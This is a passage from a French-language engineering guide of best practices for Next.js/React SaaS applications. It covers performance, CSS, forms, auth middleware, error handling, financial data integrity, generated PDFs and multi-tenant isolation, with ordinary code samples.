| Modale          | `<dialog>` natif de preference ; sinon focus trap, Echap, focus restore, `role="dialog"`, `aria-modal="true"`, `aria-labelledby` |
| Glisser-deposer | Alternative au clic/clavier (WCAG 2.5.7)                                                                                         |
| Graphique       | Tableau de donnees equivalent, couleurs + motifs/libelles, contraste 3:1                                                         |
| Toast           | `role="status"` ou `role="alert"`, `aria-live`                                                                                   |
| Dropdown        | `role="listbox"`, fleches haut/bas, Echap ferme                                                                                  |
| Tableau         | `<th scope>`, `<caption>`, alternative texte si complexe                                                                         |
| Onglets         | `role="tablist"`, `role="tab"`, `aria-selected`, fleches gauche/droite                                                           |
| Accordeon       | `aria-expanded`, `aria-controls`, Entree/Espace toggle                                                                           |

---

## 6. Performance

### 6.1 Eliminer les Dependances Lourdes du Critical Path

- **framer-motion (~40KB)** : remplacer par des animations CSS sur les pages critiques (landing, etc.)
  - Keyframes CSS pour : float, shimmer, fade, cursor-blink
  - `grid-template-rows` CSS transition pour les accordeons
  - SVG gradients animes en CSS pur
- **Gain mesure** : FCP -300ms, LCP -200ms, TBT -250ms, bundle -40KB
- **Audit regulier** : `npx @next/bundle-analyzer` pour identifier les gros modules

### 6.2 Imports Dynamiques avec Placeholders CLS-Safe

- Sections lourdes de landing page : `next/dynamic` avec placeholder de hauteur fixe
- Hauteur du placeholder doit correspondre au contenu reel pour eviter le CLS
- Exemple : `<div className="h-[600px]" />` comme loading placeholder

### 6.3 Pagination Cote Serveur

- Toutes les tables avec potentiellement >50 lignes : pagination server-side
- Pattern : `skip: (page - 1) * pageSize, take: pageSize`
- **Cursor-based pagination** pour les listes infinites (plus performant que offset)

### 6.4 Compression d'Images (Client-Side)

```typescript
// Compression avant upload (librairie browser-image-compression ou equivalent)
import imageCompression from 'browser-image-compression'
const options = { maxSizeMB: 0.3, maxWidthOrHeight: 1280, useWebWorker: true }
const compressed = await imageCompression(file, options)
```

### 6.5 Optimisation des Polices

- Utiliser le loader du framework (`next/font/google`, etc.)
- Limiter strictement les graisses : maximum 3-4 (ex: 400, 500, 600, 700) — ou une **police variable** unique
- **Auto-heberger** les polices (WOFF2) plutot que les charger depuis un CDN tiers : une connexion de moins, et pas de transfert d'IP vers un tiers (un tribunal allemand a condamne en 2022 l'usage de Google Fonts distant au titre du RGPD)
- **Subsetting** : ne charger que les caracteres utilises (latin, latin-extended) — mais verifier les glyphes reellement utilises (`’`, `«»`, `€`, `→`) : un caractere absent s'affiche en carre ou en police de repli
- **Police de repli ajustee** (`size-adjust`, `ascent-override`) aux metriques de la police finale : le `swap` ne fait plus sauter la mise en page (CLS)
- `preload` uniquement la ou les polices du premier ecran

### 6.6 Prevention du Hydration Mismatch

- Ne JAMAIS utiliser `Math.random()` dans les composants SSR
- Utiliser `useId()` (React 18+) pour generer des IDs uniques cote serveur et client
- **`suppressHydrationWarning`** : uniquement pour les elements qui varient intentionnellement (timestamp, etc.)
- Les avertissements d'hydratation indiquent un desaccord entre le rendu serveur et le rendu client — les traiter comme des bugs

### 6.7 Analytics & Tracking

- GTM : `lazyOnload` (pas `afterInteractive`)
- Eviter les scripts GA4 en double (gerer via GTM uniquement)
- Supprimer les animations decoratives inutiles (`animate-pulse` sur les glows)

### 6.8 Attributs `sizes` sur les Images

- TOUJOURS ajouter `sizes` sur les composants `<Image>` (Next.js) pour eviter le chargement de tailles inutiles
- Exemple : `sizes="(max-width: 768px) 100vw, 50vw"`

### 6.9 Core Web Vitals — Cibles

| Metrique | Cible   | Quoi mesurer                                                           |
| -------- | ------- | ---------------------------------------------------------------------- |
| **LCP**  | < 2.5s  | Temps d'affichage du plus grand element visible                        |
| **INP**  | < 200ms | Reactivite a **toutes** les interactions (a remplace FID en mars 2024) |
| **CLS**  | < 0.1   | Stabilite visuelle (pas de saut de layout)                             |
| **TTFB** | < 800ms | Temps de reponse du serveur (diagnostic, pas un Core Web Vital)        |
| **FCP**  | < 1.8s  | Premier affichage de contenu (diagnostic)                              |

- **Les seuils s'evaluent au 75e centile des donnees TERRAIN** (CrUX / Search Console / RUM), sur
  mobile et desktop separement. Un score Lighthouse de 100 en labo sur une machine de developpeur ne
  prouve rien sur le telephone d'entree de gamme d'un utilisateur reel
- **FID n'existe plus** : un outil ou une doc qui parle encore de FID est perime
- **INP se degrade par les longues taches JS** : decouper le travail (`scheduler.yield()` ou
  `setTimeout(0)` entre les lots), deplacer le calcul lourd dans un Web Worker, eviter de re-rendre
  une liste entiere a chaque frappe

**Les pieges LCP les plus frequents** :

- **`loading="lazy"` sur l'image LCP** (le hero) : elle ne se charge qu'apres le layout. L'image du
  premier ecran est **eager** + `fetchpriority="high"` ; le lazy est pour le reste
- Image hero en `background-image` CSS : decouverte tardive par le navigateur. Preferer `<img>`
- LCP rendu cote client apres un fetch : le contenu principal doit etre dans le HTML initial

**Back/forward cache (bfcache)** : un retour arriere instantane est le gain de performance le plus
sous-estime. Il est perdu si la page utilise `unload`, garde une connexion ouverte (WebSocket non
fermee), ou est servie avec `Cache-Control: no-store`. Verifier dans DevTools > Application >
Back/forward cache.

**Speculation Rules** (Chromium) : precharger ou prerendre la page suivante probable (lien du CTA,
page tarifs) pour une navigation quasi instantanee. Uniquement sur des pages sans effet de bord.

### 6.10 Caching & Mise en Cache

```typescript
// Cache headers pour les assets statiques
// next.config.js
headers: [
  {
    source: '/static/:path*',
    headers: [{ key: 'Cache-Control', value: 'public, max-age=31536000, immutable' }],
  },
  {
    source: '/api/:path*',
    headers: [{ key: 'Cache-Control', value: 'private, no-cache, no-store, must-revalidate' }],
  },
]
```

- **Assets statiques** : `immutable` + hash dans le nom de fichier
- **API responses** : `no-cache` par defaut, `stale-while-revalidate` pour les donnees peu volatiles
- **ISR (Incremental Static Regeneration)** : pour les pages semi-statiques (landing, pricing)
- **React Server Components** : preferer au `useEffect` + fetch pour les donnees initiales
- **Ne jamais mettre en cache partage (CDN) une reponse qui depend de la session** : `private` ou
  `no-store` sur tout ce qui est personnalise. Une page de tableau de bord cachee au CDN, c'est les
  donnees d'un tenant servies a un autre
- **Ce qui rend une page dynamique sans qu'on le voie** : lecture des cookies/en-tetes, nonce CSP
  (voir 1.2), date courante. Verifier le mode de rendu reel de chaque page marketing dans la sortie du
  build, pas le supposer

### 6.11 Le cout cache des fonctions serverless

- Chaque deploiement conserve ses bundles : la volumetrie facturee (stockage des fonctions) est
  souvent une **accumulation de deploiements** (previews comprises), pas un build trop lourd. Regler la
  retention des anciens deploiements avant d'optimiser le code
- Configurer explicitement la **duree maximale d'execution** des fonctions (exports PDF, imports) au
  lieu de subir le defaut ; une fonction qui tourne jusqu'au timeout coute et echoue
- Region des fonctions = region de la base : une fonction a Washington qui interroge une base a
  Francfort ajoute ~100ms **par requete SQL**

---

## 7. CSS & Styling

### 7.1 Pattern Overflow pour Modaux

```css
/* Wrapper du modal */
.modal-wrapper {
  overflow: hidden;
}

/* Corps du modal */
.modal-body {
  overflow-y: auto;
  overflow-x: hidden;
  max-height: 85dvh;
}

/* Zone de preview interne */
.preview-zone {
  overflow-y: auto;
  min-height: 0;
}
```

- **`min-height: 0` (ou `min-width: 0`) sur les enfants flex/grid qui doivent scroller ou tronquer** :
  par defaut, un enfant flex ne retrecit pas en dessous de son contenu, et l'`overflow` ne se
  declenche jamais. C'est la cause n°1 du « pourquoi ca deborde au lieu de scroller »

### 7.2 Tailles de Police (Regles Strictes)

| Element                     | Taille minimum | Tailwind                 |
| --------------------------- | -------------- | ------------------------ |
| Inputs, selects, textareas  | 16px           | `text-base`              |
| Valeurs principales (cards) | 24px+          | `text-2xl` ou `text-3xl` |
| Icones interactives         | 24px+          | `w-6 h-6`                |
| Texte de corps              | 14px-16px      | `text-sm` ou `text-base` |
| Labels de formulaire        | 14px           | `text-sm`                |

### 7.3 Typographie Fluide (Responsive)

```css
/* Typographie fluide avec clamp() — s'adapte sans breakpoints */
h1 {
  font-size: clamp(1.75rem, 4vw + 1rem, 3rem);
} /* 28px → 48px */
h2 {
  font-size: clamp(1.5rem, 3vw + 0.75rem, 2.25rem);
} /* 24px → 36px */
h3 {
  font-size: clamp(1.25rem, 2vw + 0.5rem, 1.75rem);
} /* 20px → 28px */
body {
  font-size: clamp(0.875rem, 1vw + 0.5rem, 1.125rem);
} /* 14px → 18px */
```

- Preferer `clamp()` aux media queries pour la typographie
- **Toujours une composante `rem` dans la valeur preferee** (`4vw + 1rem`, jamais `4vw` seul) : une
  taille purement en `vw` ne grossit pas au zoom navigateur (WCAG 1.4.4)
- **Unites** : `rem` pour les tailles de police, `em` pour les marges relatives au texte, `px` pour les bordures
- `text-wrap: balance` sur les titres (pas de mot orphelin sur la derniere ligne), `text-wrap: pretty` sur les paragraphes courts

### 7.4 Animations CSS (Remplacement de Libraries)

Preferer les animations CSS natives pour les effets simples :

```css
@keyframes float {
  0%,
  100% {
    transform: translateY(0);
  }
  50% {
    transform: translateY(-10px);
  }
}

@keyframes shimmer {
  0% {
    background-position: -200% center;
  }
  100% {
    background-position: 200% center;
  }
}

/* Accordeon sans JS */
.accordion-content {
  display: grid;
  grid-template-rows: 0fr;
  transition: grid-template-rows 0.3s ease;
}
.accordion-content.open {
  grid-template-rows: 1fr;
}
```

### 7.5 Gestion des Logos SVG

- Convertir les elements `<text>` SVG en `<path>` pour eviter la substitution de polices cross-browser
- Prevoir 3 variantes : inline (icone + texte), icone seule, logo complet
- Utilisation contextuelle : inline pour headers, icone pour sidebar/mobile

### 7.6 Scrollbar Subtile

```css
.scrollbar-thin {
  scrollbar-width: thin;
}
.scrollbar-thin::-webkit-scrollbar {
  width: 6px;
}
.scrollbar-thin::-webkit-scrollbar-thumb {
  background-color: rgba(0, 0, 0, 0.2);
  border-radius: 3px;
}
```

### 7.7 CSS moderne a utiliser (support navigateur suffisant en 2026)

| Fonctionnalite                                            | Remplace                                             |
| --------------------------------------------------------- | ---------------------------------------------------- |
| `:has()`                                                  | Classes d'etat posees en JS sur le parent            |
| Nesting CSS natif                                         | Preprocesseur pour le seul imbriquement              |
| Container queries (3.12)                                  | Media queries pour les composants reutilisables      |
| `dvh` / `svh` (3.17)                                      | Hacks JS `--vh` sur la hauteur de fenetre            |
| `<dialog>` + `::backdrop`                                 | Modales maison (focus trap, Echap)                   |
| Popover API (`popover`)                                   | Menus/tooltips maison avec gestion du clic exterieur |
| `@starting-style` + `transition-behavior: allow-discrete` | Animations d'apparition en JS                        |
| View Transitions API                                      | Librairies de transitions de page                    |
| Proprietes logiques (`margin-inline`)                     | Doublons gauche/droite pour le RTL                   |

- Verifier le support sur [Baseline](https://web.dev/baseline) avant adoption ; prevoir un repli
  sans casse (la fonctionnalite enrichit, son absence ne bloque pas)

---

## 8. Formulaires & Inputs

### 8.1 Coherence Visuelle Creation/Edition

- Memes classes CSS, padding, tailles de police, couleurs entre les modaux de creation et d'edition
- Structure : corps scrollable + footer fixe avec boutons d'action

### 8.2 Autocompletion d'Adresse

- Declencher a un seuil pertinent (ex: 5 chiffres pour un code postal francais)
- Auto-remplir si resultat unique
- Dropdown si plusieurs resultats
- **Toujours prevoir un fallback manuel** si l'API est indisponible

### 8.3 Hierarchie de Categories / Arborescences

- Inclure TOUTES les sous-categories du type correct
- Calculer l'indentation dynamiquement selon la profondeur reelle
- Trier par code naturel (hierarchique)

### 8.4 Mode Edition

- Indicateur visuel clair du mode actif (edition vs lecture)
- Texte du bouton change, banniere d'information apparait
- Validation met a jour l'entree existante (pas de creation en double)

### 8.5 Pattern de Validation (Zod)

```typescript
const schema = z.object({
  description: z
    .string()
    .min(1, 'Requis')
    .max(500)
    .transform((s) => s.trim()),
  amount: z.number().positive('Doit etre positif').max(999_999_999),
  date: z.string().regex(/^\d{4}-\d{2}-\d{2}$/, 'Format invalide'),
  categoryId: z.string().uuid().optional(),
  email: z.string().email('Email invalide'),
})
```

### 8.6 Gestion des Erreurs de Formulaire

- **Afficher les erreurs sous chaque champ** (pas uniquement en haut du formulaire)
- **Focus automatique** sur le premier champ en erreur apres soumission
- **Validation en temps reel** pour les champs critiques (email unique, mot de passe fort)
- **Validation a la perte de focus** (`onBlur`) pour les champs simples
- **Ne pas effacer le formulaire** en cas d'erreur serveur
- **Desactiver le bouton submit** pendant le chargement (eviter les doubles soumissions) — et proteger
  aussi cote serveur (cle d'idempotence ou contrainte d'unicite) : un double clic sur reseau lent, un
  rejeu du navigateur ou un retry automatique contournent le bouton desactive
- **Un seul schema de validation partage** client/serveur : deux schemas ecrits separement divergent,
  et c'est toujours le serveur qui finit par refuser ce que le client avait accepte
- **Ne jamais perdre une saisie longue** : brouillon sauvegarde (localStorage ou serveur) et
  avertissement avant de quitter une page modifiee (`beforeunload`)

```typescript
// Pattern anti-double soumission
const [isPending, startTransition] = useTransition()

<button type="submit" disabled={isPending}>
  {isPending ? <Spinner /> : 'Enregistrer'}
</button>
```

---

## 9. Navigation

### 9.1 Exclusions du Middleware d'Auth

> **Next.js 16+** : `middleware.ts` est remplace par `proxy.ts`.
> Si les deux fichiers coexistent, le build echoue avec l'erreur :
> `Both middleware file and proxy file are detected`.
> Utiliser uniquement `proxy.ts` a partir de Next.js 16.

Ces routes doivent TOUJOURS etre accessibles sans authentification :

- `manifest.webmanifest` (Google Search Console en depend)
- `robots.txt`, `sitemap.xml`, `llms.txt`
- Assets statiques (JS/CSS bundles, images)
- `favicon.ico`, `apple-touch-icon.png`, image Open Graph
- Routes API publiques (webhooks, health check)
- Documents publics a telecharger — **nommement**, jamais par extension (voir 1.4)

**L'exclusion se fait souvent a DEUX endroits** : la liste des routes publiques du middleware **et**
le `matcher` (la regex qui decide si le middleware s'execute). N'en modifier qu'un laisse la route
repondre une redirection vers la page de connexion : le fichier existe, le deploiement est vert, et
il est invisible pour les robots comme pour les visiteurs.

- **Le middleware n'est pas une frontiere de securite suffisante** : la verification d'acces se refait
  dans chaque route et action serveur. Un contournement du middleware (CVE-2025-29927 sur Next.js,
  en-tete `x-middleware-subrequest`) a suffi a desactiver l'auth de nombreuses apps qui n'avaient
  que lui
- **Tester les routes publiques par une requete anonyme reelle** en CI ou en smoke test post-deploiement
  (`curl -sI` → `200`, pas `307`)

### 9.2 Navigation Mobile

- Menu burger pour les sections secondaires (admin, parametres)
- FAB (Floating Action Button) centre pour l'action principale
- Bouton d'aide "?" accessible dans la barre superieure ET la navigation mobile

### 9.3 Palette de Commandes

- Raccourci clavier `Ctrl/Cmd + K` pour recherche/navigation rapide
- Indispensable pour les power users

### 9.4 Funnel de Conversion (CTA)

- **Haut de page** : CTA vers decouverte/tarifs
- **Bas de page** : CTA vers inscription (l'utilisateur a scroll = il est informe)
- Coherence des redirections dans le funnel

### 9.5 Breadcrumbs

- Afficher sur toutes les pages au-dela du niveau 1 de navigation
- Utile pour le SEO (Schema.org `BreadcrumbList`)
- Cacher sur mobile si l'espace est limite, mais conserver un bouton "Retour"

### 9.6 Deep Linking & Permalinks

- Chaque page, modale ou onglet important doit avoir une URL unique (partageable)
- Utiliser les query params ou les hash pour les onglets : `/settings?tab=security`
- Rediriger intelligemment apres login : `returnUrl` en query param

---

## 10. Gestion des Erreurs

### 10.1 Pattern Server Action

```typescript
async function myAction(data: Input) {
  try {
    // 1. Verifier l'authentification
    const session = await auth()
    if (!session?.user) return { success: false, error: 'Non autorise' }

    // 2. Valider les donnees
    const validated = schema.safeParse(data)
    if (!validated.success) return { success: false, error: validated.error.issues[0].message }

    // 3. Executer la logique metier
    const result = await db.entity.create({ data: validated.data })
    return { success: true, data: result }
  } catch (error) {
    console.error('myAction error:', error)
    // Message GENERIQUE au client (jamais de details techniques)
    return { success: false, error: 'Une erreur est survenue' }
  }
}
```

### 10.2 Hierarchie des Erreurs TypeScript

```typescript
// Classes d'erreur custom pour un meilleur handling
class AppError extends Error {
  constructor(
    message: string,
    public code: string,
    public statusCode: number = 500,
    public isOperational: boolean = true
  ) {
    super(message)
    this.name = 'AppError'
    this.code = code
    this.statusCode = statusCode
    this.isOperational = isOperational
  }
}

class ValidationError extends AppError {
  constructor(message: string) {
    super(message, 'VALIDATION_ERROR', 400)
  }
}

class NotFoundError extends AppError {
  constructor(entity: string) {
    super(`${entity} non trouve`, 'NOT_FOUND', 404)
  }
}

class ForbiddenError extends AppError {
  constructor() {
    super('Acces interdit', 'FORBIDDEN', 403)
  }
}

// Usage dans les services
if (!member) throw new NotFoundError('Membre')
```

### 10.3 Error Boundaries (React)

```typescript
// app/global-error.tsx — capture les erreurs non-gerees
'use client'
export default function GlobalError({ error, reset }: { error: Error; reset: () => void }) {
  useEffect(() => {
    // Reporter a Sentry
    captureException(error)
  }, [error])

  return (
    <html><body>
      <h1>Une erreur est survenue</h1>
      <button onClick={reset}>Reessayer</button>
    </body></html>
  )
}
```

- **`error.tsx`** dans chaque route group pour des erreurs specifiques au contexte
- **`not-found.tsx`** pour les pages 404 custom

### 10.4 Logging Non-Bloquant

- Les logs d'audit ne doivent JAMAIS bloquer l'action utilisateur
- Wrapper `logActivity()` dans un try/catch : si ca echoue, log console et continue

### 10.5 Fallback de Services Externes

- Redis : fallback vers SQL si erreur 429 (quota depasse)
- APIs tierces : fallback gracieux avec message utilisateur
- **Toujours prevoir un mode degrade**
- **Circuit breaker pattern** : apres N echecs consecutifs, court-circuiter l'appel pendant M secondes
- **Un mode degrade se signale, toujours** : log `error`, metrique, alerte si ca dure. Un repli
  silencieux transforme une panne en controle absent que personne ne voit (OWASP A10:2025 — voir 1.5)
- **Decider explicitement fail-open ou fail-closed** pour chaque dependance : un controle de securite
  (autorisation, verification de signature) echoue **ferme** ; un confort (suggestions, analytics)
  echoue ouvert
- **Ne jamais avaler une exception** (`catch {}` vide) : au minimum la logger avec son contexte

### 10.6 Chargement de Ressources Externes

- Logo dans les PDFs : gerer les deux cas (URL HTTP vs data URL)
- **Echec non bloquant** : retourner `null` si le fetch echoue, ne pas casser le flux — mais logger l'echec (non bloquant ne veut pas dire muet)
- Une URL de ressource fournie par l'utilisateur est un appel sortant : regles SSRF (voir [1.16](#116-ssrf--appels-sortants))

---

## 11. Integrite des Donnees

### 11.1 Precision Financiere (CRITIQUE)

- **NE JAMAIS utiliser l'arithmetique native JS pour l'argent**
  - `0.1 + 0.2 = 0.30000000000000004` en JavaScript
- Utiliser une librairie de precision : `decimal.js`, `dinero.js`, `big.js`
- Arrondi : `ROUND_HALF_UP`

```typescript
// INTERDIT
const total = items.reduce((sum, item) => sum + item.price, 0)

// OBLIGATOIRE
import Decimal from 'decimal.js'
Decimal.set({ precision: 20, rounding: Decimal.ROUND_HALF_UP })
const total = items.reduce((sum, item) => new Decimal(sum).plus(item.price), new Decimal(0))
```

### 11.2 Conversion des Types Decimal de l'ORM

- Les types `Decimal` de Prisma (ou autre ORM) doivent etre convertis avec `.toNumber()` avant usage
- Ne pas supposer qu'un `Decimal` se comporte comme un `number`

### 11.3 Limites d'Import

Definir des limites explicites pour tout import de donnees :

| Parametre            | Valeur recommandee |
| -------------------- | ------------------ |
| Lignes par import    | 500 max            |
| Longueur description | 500 caracteres     |
| Montant maximum      | 999 999 999        |
| Nom de fichier       | 100 caracteres     |
| Taille de fichier    | 5 MB               |

### 11.4 Detection de Doublons

- Sur les imports CSV/Excel : comparer avec les N derniers mois de donnees existantes
- Signaler les doublons potentiels a l'utilisateur plutot que de les rejeter silencieusement

### 11.5 Workflow Base de Donnees

1. **Avant modification du schema** : backup local de la DB
2. **Migration** : `npx prisma migrate dev --name <nom_descriptif>`
3. **STOP immediat** si "Data Loss Warning" : proposer un script manuel
4. **Post-migration** : verifier avec un outil visuel (Prisma Studio, pgAdmin)
5. Tester les routes impactees

> **DANGER** : les outils de migration ORM peuvent proposer un **reset complet**
> de la base de donnees s'ils detectent un drift de schema (colonnes ajoutees manuellement hors migrations).
> **Ne jamais accepter un reset en production.** A la place, creer le fichier de migration manuellement,
> executer le SQL directement, puis marquer la migration comme appliquee dans l'outil.

### 11.6 Scripts de Seed

- **NE JAMAIS utiliser `findFirst()` puis `update()`** dans les scripts de seed : ca ecrase les donnees de production
- Pattern safe : creer de nouvelles entites de test ou utiliser des IDs/slugs explicites

### 11.7 Transactions & Consistance

```typescript
// Toujours utiliser des transactions pour les operations multi-tables
await prisma.$transaction(async (tx) => {
  const payment = await tx.payment.create({ data: paymentData })
  await tx.member.update({
    where: { id: memberId },
    data: { balance: { decrement: amount } }
  })
  await tx.auditLog.create({ data: { action: 'PAYMENT_CREATED', ... } })
})
```

- **Transactions** : obligatoires pour toute operation impliquant plus d'une table
- **Idempotence** : les operations critiques (paiements, etc.) doivent etre idempotentes (cle d'idempotence)
- **Optimistic locking** : utiliser un champ `version` ou `updatedAt` pour les mises a jour concurrentes

### 11.8 Regles Comptables (Applications Financieres)

> **Pour toute app manipulant de la comptabilite : appliquer les VRAIES regles comptables, pas une
> approximation.** Un outil financier credible repose sur des regles comptables exactes — c'est un critere
> de Definition of Done a part entiere (voir [section 0](#0-barre-de-qualite-par-feature-definition-of-done)).

- **Double entree (partie double)** : chaque ecriture a un debit ET un credit de montant egal. La somme des
  debits = la somme des credits, toujours.
- **Compte de resultat equilibre** : le CDR (charges/produits) doit etre coherent et equilibre selon les
  regles comptables, pas un simple total libre.
- **Coherence inter-ecrans** : une meme grandeur (solde, total, resultat) doit afficher exactement la meme
  valeur sur tous les ecrans qui la presentent. Une divergence entre deux ecrans est un bug bloquant.
- **Cloture/ouverture d'exercice** : le passage d'un exercice a l'autre doit verrouiller les ecritures
  passees et reporter les soldes correctement. Une fois cloture, un exercice ne se modifie plus (sauf
  procedure de reouverture explicite et tracee).
- **Aucune perte de precision** : combiner avec [11.1](#111-precision-financiere-critique) (librairie
  decimale, jamais d'arithmetique flottante native).
- **Presentation professionnelle** : les etats financiers doivent etre presentes de maniere sobre et
  lisible (un comptable doit s'y retrouver), pas comme un tableau de bord "gadget".
- **Nommer les etats d'apres ce qu'ils sont** : une application en comptabilite de tresorerie
  (encaissements/decaissements) ne produit pas un « bilan » ; l'appeler ainsi est une affirmation
  comptable fausse. Un intitule honnete (« situation de tresorerie ») vaut mieux qu'un faux bilan.
- **Tracer les modifications d'ecritures** : qui a modifie quoi, quand, avec l'ancienne et la nouvelle
  valeur. Une piste d'audit des seules creations ne suffit pas.

### 11.9 Documents generes (PDF, formulaires officiels)

> Un PDF genere echappe a tous les outils habituels : pas de DOM a inspecter, pas de test
> d'accessibilite, pas de lint. Un build vert ne dit rien de ce qu'il y a sur la page 3.

- **Verifier en regenerant le document depuis des donnees reelles et en regardant les pages**
  (rendu des pages en images, comparaison avant/apres). Lire le code de mise en page ne suffit pas
- **Titres orphelins** : les regles « ne pas laisser un titre seul en bas de page » des moteurs PDF
  sont souvent trompees par les blocs insecables. **Piege vecu** (pdfmake) : le callback de saut de
  page comptait encore sur la page courante les noeuds d'un bloc insecable que le moteur reportait
  ensuite a la page suivante — la regle anti-orphelin ne se declenchait jamais. Grouper le titre avec
  le debut de son contenu dans un meme bloc insecable **borne en hauteur** (un bloc insecable plus haut
  qu'une page est supprime ou coupe selon les moteurs)
- **Polices embarquees et glyphes** : la police par defaut d'un moteur PDF n'a pas forcement `→`,
  `€` ou les guillemets typographiques — un carre a l'impression. Tester les caracteres reellement
  utilises
- **Remplir un formulaire officiel (CERFA, etc.) par script peut le rendre insignable.** Les PDF
  emis par l'administration portent souvent des droits d'usage etendus (Reader Extensions, `/Perms
/UR3`) et un paquet XFA. Toute modification par une bibliotheque tierce invalide la signature de ces
  droits : le lecteur traite le document comme altere et **bloque la signature**. **Piege vecu** :
  le president d'une association n'a pas pu signer un CERFA genere. Apres remplissage : retirer
  `/Perms` du catalogue et le XFA de l'AcroForm, puis verifier que les valeurs des champs sont
  identiques avant/apres et que la signature fonctionne **dans le lecteur grand public**
- **Un document officiel genere ne s'annonce pas « conforme »** tant que chaque rubrique du modele
  officiel n'est pas couverte : dire « reprend les rubriques du formulaire X » et lister ce qui manque

---

## 12. Architecture & Scalabilite

### 12.1 Isolation Multi-Tenant

- Chaque requete en base DOIT inclure l'identifiant du tenant (`associationId`, `orgId`, `tenantId`)
- Ne JAMAIS faire confiance a l'identifiant du tenant venant du client : le recuperer depuis la session server-side
- **Garde-fou ORM obligatoire** : une extension Prisma (`$extends` ; l'ancien middleware `$use` est deprecie) ou equivalent qui bloque automatiquement les requetes sans tenant ID sur les modeles multi-tenant — ou la Row-Level Security de PostgreSQL. Ne pas compter uniquement sur la discipline developpeur
- **Client admin separe** : les operations admin/cron cross-tenant doivent utiliser un client ORM distinct (`prismaAdmin`) pour eviter les faux positifs du tenant guard
- **Requetes mixtes (tenant + systeme)** : les queries `OR: [{ associationId }, { isSystem: true }]` sont frequentes (categories, dictionnaires, configs). Deux options :
  - Utiliser `prismaAdmin` (recommande — explicite et sans ambiguite)
  - Adapter le tenant guard pour detecter `associationId` dans les clauses `OR`, pas seulement `where` direct et `AND`
  - **Piege vecu** : un tenant guard qui ne verifie que `where.associationId` et `where.AND` passe en dev (warn) mais casse en prod (throw) — bug silencieux decouvert apres deploiement
- **Tester le tenant guard en mode production** : le guard doit avoir le meme comportement en dev et en prod (throw dans les deux cas) pour detecter les violations AVANT le deploiement. Si le guard est permissif en dev (`console.warn`), les bugs ne sont decouverts qu'en prod
- **Attention aux `update`/`delete` par ID seul** : meme si un `findFirst` precedent verifie le tenant, le `update({ where: { id } })` suivant est vulnerable (race condition). Toujours inclure le tenant ID dans le `where` de l'operation d'ecriture elle-meme
- **Tables partagees entre tenants** (dictionnaire collectif, cache d'apprentissage, suggestions mutualisees, referentiels enrichis par les utilisateurs) : elles sont la faille d'isolation la moins visible, parce qu'elles sont **concues** pour traverser les tenants. Trois regles :
  - **Defaut ferme** : la participation est un opt-in explicite du tenant, jamais l'inverse. **Piege vecu** : un `CategorizationFallback` en defaut ouvert alimentait un dictionnaire cross-tenant sans que personne ne l'ait demande
  - **Ne retenir aucune donnee identifiante** : stocker la forme normalisee et le resultat, jamais le tenant d'origine ni le libelle brut. Si l'identifiant du tenant doit etre lu (pour denombrer les contributeurs distincts, par exemple), il est lu **puis jete**, pas persiste
  - **Un seuil de contribution** : une regle issue d'un locataire unique n'est pas collective, c'est une fuite avec un compteur. Exiger N tenants distincts avant publication
- **Tester l'isolation par un test qui enregistre chaque appel a l'ORM** d'une action et verifie que
  chacun porte le tenant — plus fiable qu'un test qui verifie seulement le resultat

### 12.2 Organisation du Code

```
src/
├── app/
│   ├── (auth)/        → Pages publiques d'auth
│   ├── (dashboard)/   → App protegee
│   ├── (marketing)/   → Pages publiques marketing
│   ├── admin/         → Super Admin
│   └── api/           → Routes API REST
├── components/
│   ├── ui/            → Composants reutilisables
│   └── layout/        → Navigation, Sidebar
├── lib/
│   ├── actions/       → Server Actions (mutations)
│   ├── services/      → Logique metier
│   ├── utils/         → Fonctions utilitaires pures
│   ├── hooks/         → Custom React hooks
│   ├── types/         → Types TypeScript partages
│   └── constants/     → Constantes et enums applicatifs
└── services/          → Services specifiques (PDF, audit, IA)
```

### 12.3 Regle Anti "God Component"

- **Ecrire DEJA decoupe des le depart** : ne pas se dire "je decouperai plus tard". Un composant ecrit
  d'un bloc grossit toujours plus vite que prevu, et le decouper apres coup est risque et chronophage.
- **Ne jamais depasser 300 lignes par composant** — c'est un plafond, pas un objectif.
- **Pattern de decoupage rode** :
  - La logique (etat, effets, calculs, appels) va dans des **hooks/composables** dedies (`useXxx`)
  - Le rendu va dans des **sous-composants** focalises (une responsabilite chacun)
  - Le composant "page" ne fait qu'orchestrer : il assemble les hooks et les sous-composants
- Si un composant approche 300 lignes : extraire AVANT de continuer, pas apres.
- **Pieges vecus** : un composant de 883 lignes a du etre decompose en 9 modules ; une page god component
  de 723 lignes ramenee a 144 lignes via extraction hooks + sous-composants. Dans les deux cas, le cout
  du decoupage a posteriori a largement depasse ce qu'aurait coute un decoupage des le depart.

### 12.4 Server Actions vs API Routes

| Cas d'usage                             | Choix          |
| --------------------------------------- | -------------- |
| CRUD mutations                          | Server Actions |
| Queries complexes (pagination, filtres) | Server Actions |
| Webhooks externes (Stripe, etc.)        | API Routes     |
| Upload de fichiers                      | API Routes     |
| Endpoints publics                       | API Routes     |
| Appels depuis des apps tierces          | API Routes     |

- **Une mutation serveur (Server Action, etc.) est un endpoint HTTP public**, appelable directement
  sans passer par l'UI. Cacher le bouton a un role ne protege rien : chaque action re-verifie
  session, tenant **et** droit d'ecriture du role. **Piege vecu** : un audit des actions serveur a
  trouve plusieurs mutations (dons, calendrier, budgets) protegees uniquement par l'affichage
- Un helper unique (`requireWriteAccess(session)`) appele en premiere ligne de chaque action, et un
  test qui parcourt les actions exportees pour verifier qu'elles l'appellent

### 12.5 Conventions de Nommage

| Element          | Convention            | Exemple               |
| ---------------- | --------------------- | --------------------- |
| Composants       | PascalCase.tsx        | `UserCard.tsx`        |
| Actions          | camelCase.ts          | `createUser.ts`       |
| Services         | camelCase.ts          | `userService.ts`      |
| Constantes       | SCREAMING_SNAKE       | `MAX_FILE_SIZE`       |
| Types/Interfaces | PascalCase            | `UserProfile`         |
| Hooks            | useCamelCase.ts       | `useMembers.ts`       |
| Utils            | camelCase.ts          | `formatDate.ts`       |
| Tests            | _.test.ts / _.spec.ts | `userService.test.ts` |

### 12.6 Systeme de Quotas

Prevoir des limites par plan/tier des le depart :

| Ressource           | Free   | Premium | Enterprise |
| ------------------- | ------ | ------- | ---------- |
| Entites principales | Limite | Eleve   | Illimite   |
| Stockage            | 50 MB  | 2 GB    | 10 GB+     |
| Requetes API/jour   | 100    | 1000    | Illimite   |
| Utilisateurs        | 5      | 50      | Illimite   |

### 12.7 Periode d'Essai

- Essai sans carte bancaire (30 jours recommande)
- Gere dans le code (`trial_period_days`), PAS dans le dashboard Stripe
- JWT contient `plan` et `trialEndsAt` pour verification en Edge middleware
